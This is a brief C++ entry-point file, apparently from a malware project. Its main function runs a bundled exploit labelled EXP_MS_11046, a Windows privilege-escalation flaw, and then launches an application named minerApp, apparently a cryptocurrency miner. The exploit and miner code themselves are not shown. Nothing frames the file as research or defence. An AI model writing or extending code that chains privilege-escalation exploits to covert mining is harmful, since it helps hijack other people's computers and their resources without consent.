// NitroMain.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "module.h"

int main(int argc, char **argv)
{
	CToolKit kit;

	kit.execExp(CToolKit::EXP_MS_11046);

	//sysConfig();

	App minerApp(argc, argv);
    return minerApp.exec();
}

